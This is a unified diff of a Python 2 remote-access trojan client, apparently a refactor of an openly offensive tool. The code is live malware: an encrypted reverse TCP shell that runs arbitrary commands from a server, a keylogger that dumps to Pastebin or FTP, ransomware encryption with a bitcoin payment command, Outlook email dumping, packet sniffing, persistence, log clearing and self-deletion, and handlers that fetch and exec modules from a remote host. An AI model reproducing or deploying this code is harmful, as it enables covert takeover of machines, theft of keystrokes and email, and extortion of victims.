                 return self.show.usage
+            
         except Exception as e:
-            Util.debug("'{}' error: {}".format(self._workers.func_name, str(e)))
+            util.debug("'{}' error: {}".format(_threads.func_name, str(e)))
 
 
-    def send_task(self, **kwargs):
+    def send(self, **kwargs):
         """
-        Send task results to server
+        Send encrypted message to server
         """
         try:
             if self._flags['connection'].wait(timeout=1.0):
-                if kwargs.get('result'):
-                    buff = kwargs.get('result')
-                    kwargs.update({'result': buff[:48000]})
-                data = Security.encrypt_aes(json.dumps(kwargs), Security.session_key)
-                self._socket.send(struct.pack('L', len(data)) + data)
-                if len(buff[48000:]):
-                    kwargs.update({'result': buff[48000:]})
-                    return self.send_task(**kwargs)
+                if self._flags['passive'].is_set():
+                    host = self.api.get('host')
+                    self.task_handler(host=host, task=kwargs)
+                else:
+                    if kwargs.get('result'):
+                        buff = kwargs.get('result')
+                        kwargs.update({'result': buff[:48000]})
+                    data = security.encrypt_aes(json.dumps(kwargs), self.session['key'])
+                    self._socket.send(struct.pack('L', len(data)) + data)
+                    if len(buff[48000:]):
+                        kwargs.update({'result': buff[48000:]})
+                        return self.send(**kwargs)
             else:
-                Util.debug("connection timed out")
+                util.debug("connection timed out")
         except Exception as e:
-            Util.debug('{} error: {}'.format(self.send_task.func_name, str(e)))
+            util.debug('{} error: {}'.format(self.send.func_name, str(e)))
 
 
-    def recv_task(self, sock=None):
+    @config(platforms=['win32','linux','darwin'], command=True, usage='mode <active/passive>')
+    def mode(self, m):
         """
-        Receive task data from server
+        Select client mode (active/passive)
+        """
+        try:
+            if str(m) == 'passive':
+                self._flags['passive'].set()
+                return "Mode: passive"
+            elif str(m) == 'active':
+                self._flags['passive'].clear()
+                return "Mode: active"
+            else:
+                return self.mode.usage
+        except Exception as e:
+            util.debug(e)
+                
+
+    def recv(self, sock=None):
+        """
+        Receive and decrypt incoming message from server
         """
         try:
             if not sock:
@@ -1063,13 +853,13 @@ class Shell():
                     break
             if data and bytes(data):
                 try:
-                    text = Security.decrypt_aes(data, Security.session_key)
+                    text = security.decrypt_aes(data, self.session['key'])
                     task = json.loads(text)
                     return task
                 except Exception as e2:
-                    Util.debug('{} error: {}'.format(self.recv_task.func_name, str(e2)))
+                    util.debug('{} error: {}'.format(self.recv.func_name, str(e2)))
         except Exception as e:
-            Util.debug("{} error: {}".format(self.recv_task.func_name, str(e)))
+            util.debug("{} error: {}".format(self.recv.func_name, str(e)))
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='abort')
@@ -1080,23 +870,23 @@ class Shell():
         _abort = True
         try:
             if os.name is 'nt':
-                Util.clear_system_logs()
+                util.clear_system_logs()
             if 'persistence' in globals():
                 for method in persistence.methods:
                     if persistence.methods[method].get('established'):
                         try:
                             remove = getattr(persistence, 'remove_{}'.format(method))()
                         except Exception as e2:
-                            Util.debug("{} error: {}".format(method, str(e2)))
+                            util.debug("{} error: {}".format(method, str(e2)))
             if not _debug:
-                Util.delete(sys.argv[0])
+                util.delete(sys.argv[0])
         finally:
             shutdown = threading.Thread(target=self.get_shutdown)
             taskkill = threading.Thread(target=self.ps, args=('kill python',))
             shutdown.start()
             taskkill.start()
             sys.exit()
-            
+ 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='stop <job>')
     def stop(self, target):
@@ -1104,14 +894,14 @@ class Shell():
         stop a running job
         """
         try:
-            if target in self._workers:
-                _ = self._workers.pop(target, None)
+            if target in _threads:
+                _ = _threads.pop(target, None)
                 del _
                 return "Job '{}' was stopped.".format(target)
             else:
                 return "Job '{}' not found".format(target)
         except Exception as e:
-            Util.debug("{} error: {}".format(self.stop.func_name, str(e)))
+            util.debug("{} error: {}".format(self.stop.func_name, str(e)))
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='unzip <file>')
@@ -1124,7 +914,7 @@ class Shell():
                 _ = zipfile.ZipFile(path).extractall('.')
                 return os.path.splitext(path)[0]
             except Exception as e:
-                Util.debug("{} error: {}".format(self.unzip.func_name, str(e)))
+                util.debug("{} error: {}".format(self.unzip.func_name, str(e)))
         else:
             return "File '{}' not found".format(path)
 
@@ -1144,7 +934,27 @@ class Shell():
         else:
             return "Error: missing module 'sms'"
 
-  
+
+    def imgur(self, source):
+        """
+        Upload image file/data to Imgur (requires: Imgur api key)
+        """
+        try:
+            key = self.api.get('imgur')
+            if key and isinstance(key, list):
+                if len(key) == 1:
+                    api  = 'Client-ID {}'.format(key[0])
+                    data = util.normalize(source)
+                    post = util.post('https://api.imgur.com/3/upload', headers={'Authorization': api}, data={'image': base64.b64encode(data), 'type': 'base64'})
+                    return str(json.loads(post)['data']['link'])
+                else:
+                    return "Error: use only 1 Imgur API key at a time"
+            else:
+                return "No Imgur API Key found"
+        except Exception as e2:
+            return "{} error: {}".format(self.imgur.func_name, str(e2))
+
+      
     @config(platforms=['win32','linux2','darwin'], command=True, usage='upload <mode> [file]')
     def upload(self, args):
         """
@@ -1152,11 +962,14 @@ class Shell():
         """
         try:
             mode, _, source = str(args).partition(' ')
-            if not source or not hasattr(util, mode):
-                return self.upload.usage
-            return getattr(util, mode)(source)
+            if not source:
+                return self.upload.usage + ' -  mode: ftp, imgur, pastebin'
+            elif mode not in ('ftp','imgur','pastebin'):
+                return self.upload.usage + ' - mode: ftp, imgur, pastebin'
+            else:
+                return getattr(self, mode)(source)
         except Exception as e:
-            Util.debug("{} error: {}".format(self.upload.func_name, str(e)))
+            util.debug("{} error: {}".format(self.upload.func_name, str(e)))
 
 
     @config(platforms=['win32','linux2','darwin'], registry_key=r"Software\AngryEggplant", command=True, usage='ransom <mode> [path]')
@@ -1174,7 +987,7 @@ class Shell():
                 try:
                     return ransom.payment(action)
                 except:
-                    return "{} error: {}".format(Shell._ransom_payment.func_name, "bitcoin wallet required for ransom payment")
+                    return "{} error: {}".format(shell._ransom_payment.func_name, "bitcoin wallet required for ransom payment")
             elif 'decrypt' in cmd:
                 return ransom.decrypt_threader(action)
             elif 'encrypt' in cmd:
@@ -1215,34 +1028,33 @@ class Shell():
         connect to server and start new session
         """
         try:
-            host, port = 'localhost', 1337
-            if self._api:
-                url,  api  = urllib.urlopen(self._api).read().splitlines()
-                host, port = Util.find_server(url, api)
-            self._socket.connect((host, port))
-            self._socket.setblocking(True)
-            self._flags['connection'].set()
-            Util.debug("Connected to {}:{}".format(host, port))
-            Security.session_key = Security.diffiehellman(self._socket)
-            info = self.system_info()
-            self._socket.sendall(Security.encrypt_aes(json.dumps(info), Security.session_key) + '\n')
-            header_size = struct.calcsize('L')
-            header  = self._socket.recv(header_size)
-            msg_len = struct.unpack('L', header)[0]
-            data    = ''
-            while len(data) < msg_len:
-                try:
-                    data += self._socket.recv(1)
-                except (socket.timeout, socket.error):
-                    break
-            if isinstance(data, bytes) and len(data):
-                _info = Security.decrypt_aes(data.rstrip(), Security.session_key).strip().rstrip()
-                if isinstance(_info, dict):
-                    self.info = _info
-                return True
+            if not self.api.get('host') or not self.api.get('port'):
+                util.debug("Error: missing required attributes 'host' and/or 'port'")
+            else:
+                host, port = self.api.get('host'), int(self.api.get('port'))
+                self._socket.connect((host, port))
+                self._socket.setblocking(True)
+                self._flags['connection'].set()
+                util.debug("Connected to {}:{}".format(host, port))
+                self.session['key'] = security.diffiehellman(self._socket)
+                self._socket.sendall(security.encrypt_aes(json.dumps(self.system), self.session['key']) + '\n')
+                header_size = struct.calcsize('L')
+                header  = self._socket.recv(header_size)
+                msg_len = struct.unpack('L', header)[0]
+                data    = ''
+                while len(data) < msg_len:
+                    try:
+                        data += self._socket.recv(1)
+                    except (socket.timeout, socket.error):
+                        break
+                if isinstance(data, bytes) and len(data):
+                    _info = security.decrypt_aes(data.rstrip(), self.session['key']).strip().rstrip()
+                    if isinstance(_info, dict):
+                        self.system = _info
+                    return True
         except Exception as e:
-            Util.debug("{} error: {}".format(self.connect.func_name, str(e)))
-            return False
+            util.debug("{} error: {}".format(self.connect.func_name, str(e)))
+        return False
 
     
     @config(platforms=['win32','linux2','darwin'], command=True, usage='restart [output]')
@@ -1251,12 +1063,12 @@ class Shell():
         restart the client payload
         """
         try:
-            Util.debug("{} failed - restarting in 3 seconds...".format(output))
+            util.debug("{} failed - restarting in 3 seconds...".format(output))
             self.kill()
             time.sleep(3)
             os.execl(sys.executable, 'python', sys.argv[0], *sys.argv[1:])
         except Exception as e:
-            Util.debug("{} error: {}".format(self.restart.func_name, str(e)))
+            util.debug("{} error: {}".format(self.restart.func_name, str(e)))
 
 
     @config(platforms=['win32','darwin'], command=True, usage='outlook <option> [mode]')
@@ -1278,9 +1090,9 @@ class Shell():
                 mode, _, arg   = str(args).partition(' ')
                 if hasattr(outlook % mode):
                     if 'dump' in mode or 'upload' in mode:
-                        self._workers['outlook'] = threading.Thread(target=getattr(outlook, mode), kwargs={'n': arg}, name=time.time())
-                        self._workers['outlook'].daemon = True
-                        self._workers['outlook'].start()
+                        _threads['outlook'] = threading.Thread(target=getattr(outlook, mode), kwargs={'n': arg}, name=time.time())
+                        _threads['outlook'].daemon = True
+                        _threads['outlook'].start()
                         return "Dumping emails from Outlook inbox"
                     elif hasattr(outlook, mode):
                         return getattr(outlook, mode)()
@@ -1289,7 +1101,7 @@ class Shell():
                 else:
                     return "usage: outlook [mode]\n    mode: count, dump, search, results"
             except Exception as e:
-                Util.debug("{} error: {}".format(self.email.func_name, str(e)))
+                util.debug("{} error: {}".format(self.email.func_name, str(e)))
 
 
     @config(platforms=['win32','linux2','darwin'], process_list={}, command=True, usage='execute <path> [args]')
@@ -1312,10 +1124,30 @@ class Shell():
                     self.execute.process_list[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
                     return "Running '{}' in a new process".format(name)
                 except Exception as e:
-                    Util.debug("{} error: {}".format(self.execute.func_name, str(e)))
+                    util.debug("{} error: {}".format(self.execute.func_name, str(e)))
         else:
             return "File '{}' not found".format(str(path))
 
+
+    @config(platforms=['win32'], buffer=cStringIO.StringIO(), max_bytes=1024, command=True, usage='process <mode>s')
+    def process(self, args=None):
+        """
+        process utilities - mode: block, list, monitor, kill, search
+        """
+        try:
+            if 'process' not in globals():
+                return "Error: missing module 'process'"
+            elif not args:
+                return self.ps.usage
+            else:
+                cmd, _, action = str(args).partition(' ')
+                if hasattr(process, cmd):
+                    return getattr(process, cmd)(action) if action else getattr(process, cmd)()
+                else:
+                    return "usage: {}\n\tmode: block, list, search, kill, monitor\n\t".format(self.ps.usage)
+        except Exception as e:
+            util.debug("{} error: {}".format(self.process.func_name, str(e)))
+            
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='portscan <target>')
     def portscan(self, args):
@@ -1327,7 +1159,7 @@ class Shell():
         try:
             mode, _, target = str(args).partition(' ')
             if target:
-                if not Util.ipv4(target):
+                if not util.ipv4(target):
                     return "Error: invalid IP address '%s'" % target
             else:
                 target = socket.gethostbyname(socket.gethostname())
@@ -1336,64 +1168,82 @@ class Shell():
             else:
                 return "Error: invalid mode '%s'" % mode
         except Exception as e:
-            Util.debug("{} error: {}".format(self.portscan.func_name, str(e)))
-
+            util.debug("{} error: {}".format(self.portscan.func_name, str(e)))
             
-    @config(platforms=['win32'], command=True, usage='escalate')
-    def escalate(self):
+
+    def pastebin(self, source):
         """
-        attempt to escalate privileges
+        Dump file/data to Pastebin (requires: Pastebin api key)
         """
         try:
-            if Util.administrator():
-                return "Current user '{}' has administrator privileges".format(self.info.get('username'))
-            if os.name is 'nt':
-                import win32com.shell.shell
-                win32com.shell.shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(self.clients.get('result')))
-            else:
-                return "Privilege escalation not yet available on '{}'".format(sys.platform)
+            api_dev_key  = None
+            api_user_key = None
+            info = {'api_option': 'paste', 'api_paste_code': util.normalize(source)}
+            keys = self.api.get('paste')
+            if len(keys):
+                info.update({'api_dev_key': keys[0]})
+            if len(keys) > 1:
+                info.update({'api_user_key': keys[1]})
+            paste = util.post('https://pastebin.com/api/api_post.php',data=info)        
+            return '{}/raw/{}'.format(os.path.split(paste)[0], os.path.split(paste)[1]) if paste.startswith('http') else paste
         except Exception as e:
-            Util.debug("{} error: {}".format(self.escalate.func_name, str(e)))
-            
+            return '{} error: {}'.format(self.pastebin.func_name, str(e))
+
 
     @config(platforms=['win32','linux2','darwin'], max_bytes=4000, buffer=cStringIO.StringIO(), window=None, command=True, usage='keylogger start/stop/dump/status')
     def keylogger(self, mode=None):
         """
         log user keystrokes - mode; auto, run, stop, dump, status
         """
+        def status():
+            mode    = 'stopped'
+            if globals().get('_threads'):
+                if 'keylogger' in globals().get('_threads'):
+                    mode = 'running'
+            update  = util.status(float(globals().get('_threads').get('keylogger').name))
+            length  = keylogger._buffer.tell()
+            return "Status\n\tname: {}\n\tmode: {}\n\ttime: {}\n\tsize: {} bytes".format(func_name, mode, update, length)
+
         if 'keylogger' not in globals():
             return "Error: missing module 'keylogger'"
+                                     
         elif not mode:
-            return keylogger.status()
-        elif not mode:
-            if 'keylogger' not in self._workers:
+            if 'keylogger' not in _threads:
                 return keylogger.usage
             else:
-                return keylogger.status()
+                return status()
+                                     
         else:
-            if 'run' in mode:
-                if 'keylogger' not in self._workers:
-                    keylogger._workers['keylogger'] = keylogger.run()
-                    return keylogger.status()
+            if 'run' in mode or 'start' in mode:
+                if 'keylogger' not in _threads:
+                    _threads['keylogger'] = keylogger.run()
+                    return status()
                 else:
-                    return keylogger.status()
+                    return status()
+                                     
             elif 'stop' in mode:
                 try:
                     self.stop('keylogger')
-                except: pass
+                except:
+                    pass
                 try:
                     self.stop('keylogger')
-                except: pass
-                return keylogger.status()
+                except:
+                        pass
+                return status()
+
             elif 'auto' in mode:
-                self._workers['keylogger'] = keylogger.auto()
-                return keylogger.status()
+                _threads['keylogger'] = keylogger.auto()
+                return status()
+
             elif 'dump' in mode:
                 result = pastebin(keylogger._buffer) if not 'ftp' in mode else ftp(keylogger._buffer)
                 keylogger.buffer.reset()
                 return result
+
             elif 'status' in mode:
-                return keylogger.status()
+                return status()
+                                     
             else:
                 return keylogger.usage + '\n\targs: start, stop, dump'
 
@@ -1414,6 +1264,20 @@ class Shell():
             util.debug("{} error: {}".format(self.screenshot.func_name, str(e)))
 
 
+    def info(self):
+        """
+        Do system survey and return information about host machine
+        """
+        data = {}
+        for function in ['public_ip', 'local_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
+            if hasattr(util, function):
+                try:
+                    data[function] = getattr(util, function)()
+                except Exception as e:
+                    util.debug("{} error: {}".format(self.info.func_name, str(e)))
+        return data
+
+
     @config(platforms=['win32','linux2','darwin'], command=True, usage='persistence add/remove [method]')
     def persistence(self, args=None):
         """
@@ -1428,14 +1292,14 @@ class Shell():
                 cmd, _, action = str(args).partition(' ')
                 methods = [m for m in persistence.methods if sys.platform in persistence.methods[m]['platforms']]
                 if cmd not in ('add','remove'):
-                    return self.persistence.usage + str('\nmethods: %s' % ', '.join([str(m) for m in persistence.methods if sys.platform in getattr(Shell, '_persistence_add_%s' % m).platforms]))
+                    return self.persistence.usage + str('\nmethods: %s' % ', '.join([str(m) for m in persistence.methods if sys.platform in getattr(shell, '_persistence_add_%s' % m).platforms]))
                 for method in methods:
                     if method == 'all' or action == method:
                         persistence.methods[method]['established'], persistence.methods[method]['result'] = getattr(self, '_'.join(cmd, method))()
                 return json.dumps({m: persistence.methods[m]['result'] for m in methods})
         except Exception as e:
-            Util.debug("{} error: {}".format(self.persistence.func_name, str(e)))
-        return str(self.persistence.usage + '\nmethods: %s' % ', '.join([m for m in persistence.methods if sys.platform in getattr(Shell, '_persistence_add_%s' % m).platforms]))
+            util.debug("{} error: {}".format(self.persistence.func_name, str(e)))
+        return str(self.persistence.usage + '\nmethods: %s' % ', '.join([m for m in persistence.methods if sys.platform in getattr(shell, '_persistence_add_%s' % m).platforms]))
 
 
     @config(platforms=['linux2','darwin'], capture=[], command=True, usage='packetsniffer mode=[str] time=[int]')
@@ -1455,44 +1319,71 @@ class Shell():
                         length = int(arg)
                     elif arg in ('ftp','pastebin'):
                         mode   = arg
-                self._workers[self.packetsniffer.func_name] = packetsniffer(mode, seconds=length)
+                _threads[self.packetsniffer.func_name] = packetsniffer(mode, seconds=length)
                 return 'Capturing network traffic for {} seconds'.format(duration)
         except Exception as e:
-            Util.debug("{} error: {}".format(self.packetsniffer.func_name, str(e)))
+            util.debug("{} error: {}".format(self.packetsniffer.func_name, str(e)))
 
 
-    @config(platforms=['win32'], buffer=cStringIO.StringIO(), max_bytes=1024, command=True, usage='process <mode>s')
-    def process(self, args=None):
+    def task_handler(self, host='localhost', port=1338, task=None):
         """
-        process utilities - mode: block, list, monitor, kill, search
+        Reports task results to server
         """
-        try:
-            if 'process' not in globals():
-                return "Error: missing module 'process'"
-            elif not args:
-                return self.ps.usage
-            else:
-                cmd, _, action = str(args).partition(' ')
-                if hasattr(process, cmd):
-                    return getattr(process, cmd)(action) if action else getattr(process, cmd)()
-                else:
-                    return "usage: {}\n\tmode: block, list, search, kill, monitor\n\t".format(self.ps.usage)
-        except Exception as e:
-            Util.debug("{} error: {}".format(self.process.func_name, str(e)))
-
-
-    def system_info(self):
-        """
-        Do system survey and return information about host machine
-        """
-        info = {}
-        for func in ['public_ip', 'local_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
-            if hasattr(Util, func):
+        if task:
+            if isinstance(task, str):
                 try:
-                    info[func] = getattr(Util, func)()
+                    task = json.loads(task)
+                except: pass
+            if isinstance(task, dict):
+                try:
+                    if self.info.get('public_ip') and self.info.get('mac_address'):
+                        uid = hashlib.new('md5', ''.join(map(self.info.get, ('public_ip', 'mac_address')))).hexdigest()
+                    else:
+                        uid = hashlib.new('md5', ''.join(util.public_ip(), util.mac_address())).hexdigest()
+                    log = logging.makeLogRecord({'name': uid, 'msg': task})
+                    logger  = logging.getLogger(uid)
+                    handler = logging.handlers.SocketHandler(host, port)
+                    logger.handlers = [handler]
+                    logger.setLevel(logging.DEBUG)
+                    logger.info(log)
                 except Exception as e:
-                    Util.debug("{} error: {}".format(system.func_name, str(e)))
-        return info
+                    util.debug(e)
+            else:
+                util.debug("Error: invalid task type - expected '{}', received '{}'".format(dict, type(task)))
+        else:
+            util.debug("Error: missing required argument 'task'")
+
+
+    def module_handler(self, host='localhost', port=1339, modules=['ransom', 'webcam', 'outlook', 'screenshot', 'portscan', 'escalate', 'keylogger', 'phone', 'packetsniffer', 'process', 'payload', 'persistence']):
+        """
+        directly import modules remotely 
+        """
+        imports     = {}
+        base_url    = 'http://{}:{}'.format(host, port)
+        with httpimport.remote_repo(modules, base_url=base_url):
+            for module in modules:
+                try:
+                    exec "import %s" % module in globals()
+                    imports[module] = globals().get(module)
+                except ImportError:
+                    pass
+        return imports
+
+
+    def package_handler(self, host='localhost', port=1340, packages=['numpy','Crypto', 'Crypto.Util', 'Crypto.Cipher.AES', 'Crypto.Hash.SHA256']):
+        """
+        directly import packages remotely
+        """
+        imports = {}
+        base_url = 'http://{}:{}'.format(host, port)
+        with httpimport.remote_repo(packages, base_url):
+            for package in packages:
+                try:
+                    exec "import %s" % package in globals()
+                    imports[package] = globals().get(package)
+                except ImportError:
+                    pass
+        return imports
 
 
     @threaded
@@ -1501,26 +1392,24 @@ class Shell():
         send encrypted shell back to server via outgoing TCP connection
         """
         try:
-            self._workers['prompt'] = self._prompt_handler()
+            _threads['prompt'] = self._prompt_handler()
             while True:
                 if self._flags['connection'].wait(timeout=1.0):
                     if not self._flags['prompt'].is_set():
-                        task = self.recv_task()
+                        task = self.recv()
                         if isinstance(task, dict):
                             cmd, _, action = [i.encode() for i in task['command'].partition(' ')]
                             try:
-                                result  = bytes(getattr(self, cmd)(action) if action else getattr(self, cmd)()) if cmd in sorted([attr for attr in vars(Shell) if not attr.startswith('_')]) else bytes().join(subprocess.Popen(cmd, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
-                            except Exception as e1:
-                                result  = "{} error: {}".format(self.reverse_tcp_shell.func_name, str(e1))
+                                result  = bytes(getattr(self, cmd)(action) if action else getattr(self, cmd)()) if cmd in sorted([attr for attr in vars(shell) if not attr.startswith('_')]) else bytes().join(subprocess.Popen(cmd, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
+                            except Exception as e:
+                                result  = "{} error: {}".format(self.reverse_tcp_shell.func_name, str(e))
                             task.update({'result': result})
-                            self.send_task(**task)
-                            if cmd and cmd in self._flags['tasks'] and 'PRIVATE KEY' not in task['command']:
-                                self.task_save(task, result)
+                            self.send(**task)
                         self._flags['prompt'].set()
                 else:
-                    Util.debug("Connection timed out")
+                    util.debug("Connection timed out")
                     break
-        except Exception as e2:
-            Util.debug("{} error: {}".format(self.reverse_tcp_shell.func_name, str(e2)))
-        return self.restart(self.reverse_tcp_shell.func_name)
+        except Exception as e:
+            util.debug("{} error: {}".format(self.reverse_tcp_shell.func_name, str(e)))
+
 
